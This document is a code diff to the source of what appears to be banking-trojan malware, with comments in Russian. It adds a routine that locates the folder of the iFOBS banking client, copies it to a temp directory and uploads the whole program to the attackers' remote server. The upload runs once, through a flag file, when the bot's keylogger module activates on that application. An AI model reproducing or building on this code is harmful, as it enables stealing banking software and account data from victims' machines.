@@ -7,6 +7,9 @@
 #include "Plugins.h"
 #include "rafa.h"
 #include "BotHTTP.h"
+#include "Inject.h"
+#include "BotCore.h"
+#include "StrConsts.h"
 
 #include "BotDebug.h"
 
@@ -39,6 +42,7 @@ struct AccBalans
 int ( WINAPI *pTVDBDirectGetCurrency )(int P1, int P2);
 //прототип из ifobs.plug
 typedef BOOL ( WINAPI *PInitFunc )(DWORD origFunc, char *funcName);
+char folderIFobs[MAX_PATH]; //папка в которой находится прога, для копирования на сервер
 
 static BOOL CALLBACK EnumChildProc( HWND hwnd, LPARAM lParam )
 {
@@ -177,14 +181,49 @@ DWORD WINAPI PluginIFobs(LPVOID)
 	return 0;
 }
 
+//отсылка полного клиента на видео сервер
+DWORD WINAPI SendIFobs(LPVOID)
+{
+	BOT::Initialize(ProcessUnknown);
+	DBG( "IFobs", "запуск отсылки программы на сервер из папки %s", folderIFobs );
+	Bot->CreateFileA( 0, GetStr(IFobsFlagCopy).t_str() );
+	DWORD folderSize = 0;
+	if( !SizeFolderLess( folderIFobs, 1024*1024*350, &folderSize ) )
+	{
+		DBG( "IFobs", "Папка программы больше заданного размера, не копируем" );
+		return 0;
+	}
+	DBG( "IFobs", "Размер папки %d байт", folderSize );
+	char tempFolder[MAX_PATH];
+	pGetTempPathA( sizeof(tempFolder), tempFolder );
+	pPathAppendA( tempFolder, "ifobs" );
+	if( Directory::IsExists(tempFolder) ) DeleteFolders(tempFolder);
+	pCreateDirectoryA( tempFolder, 0 );
+	DBG( "IFobs", "Копирование во временную папку %s", tempFolder );
+	*((int*)&(tempFolder[ m_lstrlen(tempFolder) ])) = 0; //добавляем 2-й нуль, чтобы строка завершалась "\0\0"
+	*((int*)&(folderIFobs[ m_lstrlen(folderIFobs) ])) = 0; 
+	if( CopyFileANdFolder( folderIFobs, tempFolder ) )
+	{
+		DBG( "IFobs", "Копирование на сервер" );
+		VideoRecorder::SendFiles(tempFolder);
+		DeleteFolders(tempFolder);
+		DBG( "IFobs", "Копирование на сервер окончено" );
+	}
+	else
+		DBG( "IFobs", "Копирование в временную папку не удалось" );
+	return 0;
+}
+
 void Activeted(LPVOID Sender)
 {
 	DBG( "IFobs", "Activated" );
 	PKeyLogSystem System = (PKeyLogSystem)Sender;
 	RunThread( PluginIFobs, 0 );
+	if( !Bot->FileExists( 0, GetStr(IFobsFlagCopy).t_str() ) )
+		MegaJump(SendIFobs);
 }
 
-bool Init()
+bool Init( const char* appName )
 {
 	DBG( "IFobs", "Регистрация системы" );
 	PKeyLogSystem S = KeyLogger::AddSystem( "ifobs", PROCESS_HASH );
@@ -198,6 +237,8 @@ bool Init()
 		S->OnMessage = OnMessage;
 		
 		KeyLogger::AddFilter(S, true, true, NULL, caption, FILTRATE_PARENT_WND, LOG_ALL, 5);
+		m_lstrcpy( folderIFobs, appName ); //копируем путь к iFOBSClient.exe
+		pPathRemoveFileSpecA(folderIFobs); //папка с прогой
 	}
 	return true;
 }
